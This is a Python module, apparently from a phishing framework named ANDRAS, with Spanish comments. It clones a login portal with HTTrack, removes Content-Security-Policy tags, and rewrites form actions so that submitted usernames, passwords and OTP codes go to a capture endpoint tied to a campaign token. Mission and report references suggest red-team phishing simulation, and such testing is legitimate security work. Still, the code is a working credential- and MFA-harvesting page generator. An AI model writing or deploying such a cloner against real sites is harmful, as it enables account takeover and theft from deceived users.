"""Clonador de portales con HTTrack.

Baja un portal a disco y lo deja listo para servirse bajo el token de una campaña. Las rutas
se reescriben a relativas para que el espejo funcione en local, los formularios apuntan al
capturador de ANDRAS y se conserva el `action` original para poder enseñarlo en el parte.

El clon es estático: sirve para credenciales y OTP, no para portales que exigen sesión viva.
"""
from __future__ import annotations

import hashlib
import re
import secrets
import shutil
import subprocess
from pathlib import Path
from urllib.parse import unquote, urljoin, urlparse

from andras.core import ROOT

MIME = {
    ".html": "text/html; charset=utf-8",
    ".htm": "text/html; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".json": "application/json",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".gif": "image/gif",
    ".svg": "image/svg+xml",
    ".webp": "image/webp",
    ".ico": "image/x-icon",
    ".woff": "font/woff",
    ".woff2": "font/woff2",
    ".ttf": "font/ttf",
    ".txt": "text/plain; charset=utf-8",
}

USER_AGENT = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/130.0 Safari/537.36")

FORM = re.compile(r"<form\b[^>]*>", re.IGNORECASE)
ACTION = re.compile(r"""\baction\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))""", re.IGNORECASE)
CSP_META = re.compile(r"""<meta[^>]+http-equiv=["']?Content-Security-Policy["']?[^>]*>""", re.IGNORECASE)

FIELDS = {
    "user": ("username", "email", "user", "login", "identifier", "usuario", "correo"),
    "secret": ("password", "pass", "pwd", "secret", "contrasena", "contraseña"),
    "otp": ("otp", "code", "codigo", "código", "token", "mfa", "totp"),
}


class CloneError(RuntimeError):
    pass


def slug(mission_id: str, label: str) -> str:
    digest = hashlib.sha256(f"{mission_id}:{label}".encode()).hexdigest()[:12]
    return digest


def root_for(mission_id: str, label: str) -> Path:
    path = ROOT / "data" / "clones" / mission_id / slug(mission_id, label)
    path.mkdir(parents=True, exist_ok=True)
    return path


def entry_for(root: Path, url: str) -> Path:
    """Archivo que corresponde a la URL pedida dentro del espejo de HTTrack."""
    parsed = urlparse(url)
    host = parsed.netloc
    relative = unquote(parsed.path).strip("/")
    bases = [root / host, root] if host else [root]
    candidates = []
    for base in bases:
        if not relative:
            candidates += [base / "index.html", base / "index.htm"]
            continue
        target = base / relative
        candidates += [target, target.parent / (target.name + ".html"), target / "index.html"]
    for candidate in candidates:
        if candidate.is_file():
            return candidate
    for fallback in root.rglob("index.html"):
        return fallback
    raise CloneError("el espejo no tiene índice: el portal puede exigir JavaScript")


def fetch(url: str, dest: Path, *, timeout: int = 180, depth: int = 3) -> Path:
    """Baja el portal con HTTrack. Devuelve el archivo de entrada del espejo."""
    binary = shutil.which("httrack") or str(ROOT / "vendor" / "httrack" / "httrack")
    if not Path(binary).is_file():
        raise CloneError("falta httrack: brew install httrack")
    argv = [binary, url, "-O", str(dest), "-q", "-K", "--near", f"-r{depth}",
            "--sockets=4", "--timeout=30", f"--user-agent={USER_AGENT}", "-%v"]
    try:
        proc = subprocess.run(argv, capture_output=True, text=True, timeout=timeout, check=False)
    except (OSError, subprocess.SubprocessError) as exc:
        raise CloneError(f"no se pudo lanzar httrack: {exc}") from exc
    (dest / "httrack.log").write_text((proc.stdout or "") + (proc.stderr or ""), errors="replace")
    return entry_for(dest, url)


def rewrite(html_text: str, *, original: str, token: str) -> str:
    """Apunta los formularios al capturador y deja el destino original en un campo oculto."""
    html_text = CSP_META.sub("", html_text)
    if "__capture" in html_text:
        return html_text

    def replace(match: re.Match[str]) -> str:
        tag = match.group(0)
        action = ACTION.search(tag)
        raw = (action.group(1) or action.group(2) or action.group(3) or "").strip() \
            if action else ""
        target = urljoin(original, raw)
        clean = ACTION.sub("", tag).replace("<form", f"<form action='/{token}/__capture'", 1)
        return clean + f"<input type='hidden' name='__next' value='{target}'>"

    return FORM.sub(replace, html_text)


def prepare(entry: Path, original: str, token: str) -> Path:
    """Reescribe la entrada para que sus formularios pasen por ANDRAS."""
    text = entry.read_text(errors="replace")
    entry.write_text(rewrite(text, original=original, token=token), errors="replace")
    return entry


def resolve(root: Path, entry: Path, path: str) -> Path:
    """Traduce una ruta de la URL al archivo del espejo, sin salirse de la raíz."""
    base = root.resolve()
    relative = unquote(path).lstrip("/")
    if not relative:
        return entry
    candidate = (entry.parent / relative).resolve()
    if base not in candidate.parents and candidate != base:
        raise CloneError("ruta fuera del espejo")
    if candidate.is_dir():
        candidate = candidate / "index.html"
    if not candidate.is_file() and not candidate.suffix:
        candidate = candidate.with_suffix(".html")
    return candidate


def mime(path: Path) -> str:
    return MIME.get(path.suffix.lower(), "application/octet-stream")


def pick(data: dict, kind: str) -> str:
    """Primer valor no vacío de los nombres habituales de ese campo."""
    lowered = {k.lower(): v for k, v in data.items()}
    for name in FIELDS[kind]:
        value = lowered.get(name)
        if value:
            return value[0][:300] if isinstance(value, list) else str(value)[:300]
    return ""


def create(conn, mission_id: str, url: str, *, label: str = "",
           timeout: int = 300, depth: int = 2) -> str:
    """Baja el portal y guarda el clon. Devuelve su id."""
    from andras.store.db import now

    ident = secrets.token_hex(8)
    root = root_for(mission_id, label or ident)
    entry = fetch(url, root, timeout=timeout, depth=depth)
    conn.execute("INSERT INTO clones(id,mission_id,label,url,root,entry,created_at)"
                 " VALUES(?,?,?,?,?,?,?)",
                 (ident, mission_id, label or urlparse(url).netloc, url, str(root),
                  str(entry), now()))
    conn.commit()
    return ident


def attach(conn, campaign_id: str, clone_id: str) -> str:
    """Reescribe la entrada con el token de la campaña y la enlaza."""
    row = conn.execute("SELECT url, root FROM clones WHERE id=?", (clone_id,)).fetchone()
    if not row:
        raise CloneError(f"clon inexistente: {clone_id}")
    entry = entry_for(Path(row["root"]), row["url"])
    prepare(entry, row["url"], campaign_id)
    conn.execute("UPDATE clones SET entry=? WHERE id=?", (str(entry), clone_id))
    conn.execute("UPDATE campaigns SET clone_id=? WHERE id=?", (clone_id, campaign_id))
    conn.commit()
    return str(entry)
